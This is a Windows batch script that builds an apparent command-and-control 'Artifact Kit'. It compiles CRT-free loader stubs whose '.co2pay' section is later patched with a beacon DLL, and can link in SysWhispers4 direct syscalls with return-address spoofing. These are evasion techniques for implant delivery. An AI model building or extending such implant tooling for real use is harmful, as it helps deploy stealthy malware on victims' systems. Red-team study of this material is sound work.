@echo off
REM build_all.bat -- compile all Artifact Kit stubs (x64 + x86).
REM
REM Each subdirectory <name>/ contains <name>.c with a .co2pay section.
REM Output: bin\<name>.x64.exe  (or .dll for dll_*)
REM         bin\<name>.x86.exe  (or .dll for dll_*)
REM
REM artifact-gen later patches the .co2pay section with the real beacon DLL.

setlocal enabledelayedexpansion

set SCRIPT_DIR=%~dp0
set BIN_DIR=%SCRIPT_DIR%bin

REM --- Detect Visual Studio installation ---
set "VCVARS="
if exist "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat" (
    set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat"
) else if exist "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvarsall.bat" (
    set "VCVARS=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvarsall.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat" (
    set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat" (
    set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
)
if "!VCVARS!"=="" (
    echo [X] ERROR: Visual Studio 2022 not detected.
    exit /b 1
)

if not exist "%BIN_DIR%" mkdir "%BIN_DIR%"

REM Auto-generate SW4 syscalls if any stub has .syscalls marker but
REM the generated files are missing.
set "NEED_SW4=0"
for /d %%D in ("%SCRIPT_DIR%*") do (
    if exist "%%D\.syscalls" set "NEED_SW4=1"
)
if "%NEED_SW4%"=="1" if not exist "%SCRIPT_DIR%..\syscalls\SW4Syscalls.c" (
    echo [*] SW4 syscalls not generated yet -- running gen_for_kit.bat balanced...
    call "%SCRIPT_DIR%..\utils\SysWhispers4-main\gen_for_kit.bat" balanced
    if errorlevel 1 (
        echo [X] auto-generation failed -- fix SW4 setup or remove .syscalls markers
        exit /b 1
    )
    echo.
)

set TOTAL=0
set OK=0
set FAIL=0

echo ============================================
echo  Co2H Artifact Kit -- Build All
echo  Architectures: x64, x86
echo ============================================
echo.

REM ===== x64 ==================================================================
echo ------ x64 ------
call "!VCVARS!" amd64 >nul 2>&1
cd /d "%SCRIPT_DIR%"
for /d %%D in ("%SCRIPT_DIR%*") do (
    set "DIRNAME=%%~nxD"
    if /i not "!DIRNAME!"=="bin" (
        if exist "%%D\!DIRNAME!.c" call :build_one "%%D\!DIRNAME!.c" "!DIRNAME!" "x64"
    )
)

echo.

REM ===== x86 ==================================================================
echo ------ x86 ------
call "!VCVARS!" amd64_x86 >nul 2>&1
cd /d "%SCRIPT_DIR%"
for /d %%D in ("%SCRIPT_DIR%*") do (
    set "DIRNAME=%%~nxD"
    if /i not "!DIRNAME!"=="bin" (
        if exist "%%D\!DIRNAME!.c" call :build_one "%%D\!DIRNAME!.c" "!DIRNAME!" "x86"
    )
)

echo.
echo ============================================
echo  Results: %OK%/%TOTAL% succeeded, %FAIL% failed
echo  Output:  %BIN_DIR%\
echo ============================================

if %FAIL% GTR 0 exit /b 1
exit /b 0

REM ===========================================================================
:build_one
set "SRC=%~1"
set "NAME=%~2"
set "ARCH=%~3"

REM .x64only marker -> skip x86 build for this stub
if exist "%SCRIPT_DIR%!NAME!\.x64only" if /i "!ARCH!"=="x86" (
    echo [.] Skipping x86: !NAME! [.x64only]
    goto :eof
)

set /a TOTAL+=1

REM Output type: dll_* -> .dll, all others (exe_*, service_*, ...) -> .exe
set "OUT_EXT=exe"
set "ENTRY_FLAG=/ENTRY:stub_main"
set "SUBSYSTEM=/SUBSYSTEM:WINDOWS"
set "DLL_FLAG="
echo !NAME! | findstr /b "dll_" >nul && (
    set "OUT_EXT=dll"
    set "ENTRY_FLAG=/ENTRY:DllMain"
    set "SUBSYSTEM="
    set "DLL_FLAG=/DLL"
)
REM .console marker -> SUBSYSTEM:CONSOLE (for debug stubs)
if exist "%SCRIPT_DIR%!NAME!\.console" set "SUBSYSTEM=/SUBSYSTEM:CONSOLE"

REM .syscalls marker -> link with SW4Syscalls (../syscalls/SW4Syscalls.{h,c,asm})
set "SW4_DIR=%SCRIPT_DIR%..\syscalls"
set "USE_SW4=0"
if exist "%SCRIPT_DIR%!NAME!\.syscalls" set "USE_SW4=1"

set "OUT_OBJ=%BIN_DIR%\!NAME!.!ARCH!.obj"
set "OUT_BIN=%BIN_DIR%\!NAME!.!ARCH!.!OUT_EXT!"
set "SW4_C_OBJ=%BIN_DIR%\SW4Syscalls.!ARCH!.obj"
set "SW4_ASM_OBJ=%BIN_DIR%\SW4SyscallsAsm.!ARCH!.obj"
set "SW4_SHIM_OBJ=%BIN_DIR%\sw4_shims.!ARCH!.obj"

echo [*] Building: !NAME! (!ARCH!) [.!OUT_EXT!] ...

REM No CRT: /Zl strips default-lib record, no /MT.
REM Включаем путь к SW4 заголовку если стаб помечен .syscalls.
set "SW4_INCLUDE="
if "!USE_SW4!"=="1" set "SW4_INCLUDE=/I"%SW4_DIR%""

cl.exe /nologo /c /Zl /GS- /O2 /TC /W3 ^
    /DWIN32_LEAN_AND_MEAN /D_WIN32_WINNT=0x0601 !SW4_INCLUDE! ^
    /Fo"!OUT_OBJ!" "!SRC!" >nul 2>&1
if errorlevel 1 (
    echo     [X] COMPILE FAILED: !NAME!.!ARCH!
    set /a FAIL+=1
    goto :eof_one
)

REM Компиляция SW4Syscalls.{c,asm} если нужно.
REM Guard-defines для типов из SDK заранее вшиты в SW4Syscalls_Types.h
REM (патч делает gen_for_kit.bat).
set "SW4_OBJS="
if "!USE_SW4!"=="1" (
    if not exist "%SW4_DIR%\SW4Syscalls.c" (
        echo     [X] SW4 missing: запустите kit\utils\SysWhispers4-main\gen_for_kit.bat
        set /a FAIL+=1
        goto :eof_one
    )
    cl.exe /nologo /c /Zl /GS- /O2 /TC /W3 /DWIN32_LEAN_AND_MEAN ^
        /Fo"!SW4_C_OBJ!" "%SW4_DIR%\SW4Syscalls.c" >nul 2>&1
    if errorlevel 1 (
        echo     [X] SW4 .c COMPILE FAILED
        set /a FAIL+=1
        goto :eof_one
    )

    if "!ARCH!"=="x64" (
        ml64.exe /nologo /c /Fo"!SW4_ASM_OBJ!" "%SW4_DIR%\SW4Syscalls.asm" >nul 2>&1
    ) else (
        ml.exe /nologo /c /safeseh /Fo"!SW4_ASM_OBJ!" "%SW4_DIR%\SW4Syscalls.asm" >nul 2>&1
    )
    if errorlevel 1 (
        echo     [X] SW4 .asm ASSEMBLE FAILED
        set /a FAIL+=1
        goto :eof_one
    )

    REM Минимальные shim'ы (memcpy/__chkstk/SpoofReturnAddr) для /NODEFAULTLIB
    if exist "%SW4_DIR%\sw4_shims.c" (
        cl.exe /nologo /c /Zl /GS- /O2 /TC /W3 /DWIN32_LEAN_AND_MEAN ^
            /Fo"!SW4_SHIM_OBJ!" "%SW4_DIR%\sw4_shims.c" >nul 2>&1
        if errorlevel 1 (
            echo     [X] SW4 shims COMPILE FAILED
            set /a FAIL+=1
            goto :eof_one
        )
        set "SW4_OBJS="!SW4_C_OBJ!" "!SW4_ASM_OBJ!" "!SW4_SHIM_OBJ!""
    ) else (
        set "SW4_OBJS="!SW4_C_OBJ!" "!SW4_ASM_OBJ!""
    )
)

REM No CRT: /NODEFAULTLIB, only kernel32+user32.
link.exe /nologo /NODEFAULTLIB !DLL_FLAG! !SUBSYSTEM! !ENTRY_FLAG! ^
    /OUT:"!OUT_BIN!" "!OUT_OBJ!" !SW4_OBJS! kernel32.lib user32.lib >nul 2>&1
if errorlevel 1 (
    echo     [X] LINK FAILED: !NAME!.!ARCH!
    set /a FAIL+=1
    goto :eof_one
)

for %%F in ("!OUT_BIN!") do set "FSIZE=%%~zF"
echo     [+] OK: !FSIZE! bytes -- bin\!NAME!.!ARCH!.!OUT_EXT!
set /a OK+=1

:eof_one
if exist "!OUT_OBJ!" del /q "!OUT_OBJ!"
if exist "!SW4_C_OBJ!" del /q "!SW4_C_OBJ!"
if exist "!SW4_ASM_OBJ!" del /q "!SW4_ASM_OBJ!"
if exist "!SW4_SHIM_OBJ!" del /q "!SW4_SHIM_OBJ!"
goto :eof
